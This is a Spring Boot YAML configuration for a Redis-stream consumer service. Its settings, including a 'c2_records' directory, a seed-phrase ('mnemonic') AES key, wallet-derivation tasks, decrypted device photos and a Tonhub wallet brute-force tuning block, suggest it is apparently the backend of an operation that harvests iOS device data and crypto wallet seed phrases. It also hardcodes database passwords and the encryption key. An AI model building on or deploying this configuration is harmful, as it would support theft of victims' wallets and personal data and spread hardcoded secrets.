server:
  port: 8204
  max-http-header-size: 2MB
  connection-timeout: 10s
  tomcat:
    max-http-form-post-size: 50MB
    max-swallow-size: 10MB
    threads:
      max: 50
      min-spare: 5
    max-connections: 500
    accept-count: 100
  compression:
    enabled: true
    mime-types: application/json,application/xml,text/html,text/plain
    min-response-size: 1024

spring:
  application:
    name: 18-consumer-server
  cloud:
    nacos:
      discovery:
        server-addr: http://127.0.0.1:8848
        namespace: a5b3bd13-9c96-4216-93fb-8b077e537f46 #测试
        #namespace: 31ee03b7-c6df-436d-990d-d6c08aa5c20a #开发
  mvc:
    pathmatch:
      matching-strategy: ant_path_matcher
  servlet:
    multipart:
       max-file-size: 500MB
       max-request-size: 500MB
  jackson:
    date-format: yyyy-MM-dd HH:mm:ss
    time-zone: GMT+8

  # spring-data-redis 自动配置用（RedisTemplate / RedisPush 依赖 Lettuce）
  redis:
    host: 127.0.0.1
    port: 6379
    password:
    database: 0
    timeout: 5000ms
    lettuce:
      pool:
        max-active: 50    # 8核3实例：50（3×50=150总连接）
        max-idle: 20
        min-idle: 5
        max-wait: 5000ms
    # JedisPool 配置（Consumer 主流程用）
    jedis:
      pool:
        max-active: 48    # 8核3实例：48（3×48=144总连接），poller+worker+autoclaim+ack+retry 需求
        max-idle: 24
        min-idle: 4

  datasource:
    driver-class-name: com.mysql.cj.jdbc.Driver
    #url: jdbc:mysql://127.0.0.1:3306/ioslianjie?useUnicode=true&characterEncoding=utf-8&serverTimezone=GMT%2B8
    #username: root
    #password: Root@123
    url: jdbc:mysql://127.0.0.1:3306/ioslianjie?useUnicode=true&characterEncoding=utf-8&serverTimezone=GMT%2B8
    username: ioslianjie
    password: BAF4R22mwenXXxEH
    type: com.alibaba.druid.pool.DruidDataSource
    initialSize: 10      # 启动时建10个连接，避免连接风暴
    minIdle: 10
    maxActive: 40        # 8核3实例：40（3×40=120总连接，MySQL需max_connections>=500）
    maxWait: 5000        # 5秒，避免DB连接池耗尽时worker长时间阻塞假死
    timeBetweenEvictionRunsMillis: 30000
    minEvictableIdleTimeMillis: 50000
    validationQuery: SELECT 1
    testWhileIdle: true
    testOnBorrow: false  # 关闭借出验证（testWhileIdle已保证连接可用），省~5-10ms/次DB操作
    testOnReturn: false
    connectionErrorRetryAttempts: 3
    breakAfterAcquireFailure: false

# ============= Consumer Worker 运行参数（8核16G 3实例） =============
consumer:
  # 落盘根（同 API 进程 api18.upload-dir，war_unpack 读 .bin / Bip39Util 缓存用）
  #upload-dir: D:/c2_records
  upload-dir: /opt/news4/data/apilog
  # 8核3实例：2（3×2=6线程）
  main-threads: 2
  # 8核3实例：2
  parse-ci-threads: 2
  auto-claim-idle-ms: 1800000
  main-claim-idle-ms: 600000
  # 单条消息最大重试次数（含首次消费，超过进 DLQ）
  max-attempts: 5
  # 默认 1000ms → 第1次重试1s，第2次2s，第3次4s，第4次8s
  retry-backoff-base-ms: 1000
  # DLQ 消息最长保留毫秒（默认 7 天），超期自动清理
  dlq-retention-ms: 604800000
  # 助记词 AES 密钥
  mnemonic-aes-key: "Mn3m0n1c@2024!SecureKey#news2"
  # 是否向 news4:tasks 投递 wallet_derive
  news4-task-enabled: true
  # 8核3实例：2
  news4-threads: 2
  # news4 consumer 轮询间隔 ms
  news4-poll-interval-ms: 1000
  # news4 XAUTOCLAIM idle（默认 10min）
  news4-claim-idle-ms: 600000
  # photo 队列并发（I/O密集型，8核3实例：2）
  photo-threads: 2
  # photo consumer 轮询间隔 ms
  photo-poll-interval-ms: 1000
  # photo XAUTOCLAIM idle（默认 10min）
  photo-claim-idle-ms: 600000
  # photo 批量拉取大小
  photo-batch-size: 8
  # nb_notestore（NoteStore 正文追加补齐，独立队列）
  nb-notestore-threads: 2
  nb-notestore-poll-interval-ms: 1500
  nb-notestore-claim-idle-ms: 900000
  nb-notestore-batch-size: 4
  # 解密后图片落盘目录
  #photo-dir: D:/c2_records/photos
  photo-dir: /opt/news4/data/photos
  photo-url-prefix: data/photos
  # 批量拉取大小（主队列）
  batch-size: 8
  # parse_ci 批量拉取大小（CPU密集，建议4）
  parse-ci-batch-size: 4
  # news4 批量拉取大小
  news4-batch-size: 8
  poll-interval-ms: 500
  parse-ci-poll-interval-ms: 2000
  # consumer-name 留空则自动使用 hostname + 随机
  consumer-name:
  # tonhub暴力破解优化配置
  tonhub-brute-sync-timeout-ms: 0  # 0=完全异步不阻塞worker
  tonhub-brute-threads: 0          # 0=自动CPU/2=4线程（8核）
  tonhub-brute-serialize: true     # 串行化：限制同时爆破的device数
  tonhub-brute-serialize-permits: 1  # 许可数：同时只1个device在爆破

# =============================================================================
# 【换另一套时必改】Redis 队列隔离（本机多套同 Redis 时防串消费）
# -----------------------------------------------------------------------------
# 同一套里下列服务必须改成一样：
#   18-ctwo-server / 18-device-server / 18-consumer-server  的 queue.*
# 推荐做法（只改一项即可隔离）：
#   queue.prefix: suite-a     → 实际 key 变成 suite-a:api18:tasks 等
#   另一套用 suite-b
# =============================================================================
queue:
  prefix: "suite-a"                          # 【换套改这里】例：suite-a / suite-b；单套留空
  stream-main: api18:tasks            # 主任务流（ctwo/device 生产，本服务消费）
  stream-parse-ci: api18:tasks:parse_ci
  stream-photo: api18:tasks:photo
  stream-nb-notestore: api18:tasks:nb_notestore
  stream-news4: news4:tasks           # wallet_derive 等
  group-main: api18-workers           # 消费组名也会带 prefix
  group-parse-ci: api18-parse-ci
  group-news4: news4-workers
  group-photo: api18-photo-workers
  group-nb-notestore: api18-nb-notestore
  dlq-main: api18:tasks:dead
  dlq-parse-ci: api18:tasks:parse_ci:dead
  dlq-news4: news4:tasks:dead
  dlq-photo: api18:tasks:photo:dead
  dlq-nb-notestore: api18:tasks:nb_notestore:dead

# news4 旁路线程池（与 n4-worker 隔离；listen / balance 互不堵塞）
news4:
  listen-pool:
    core-size: 4
    max-size: 8
    queue-capacity: 5000
  balance-pool:
    core-size: 4
    max-size: 12
    queue-capacity: 5000

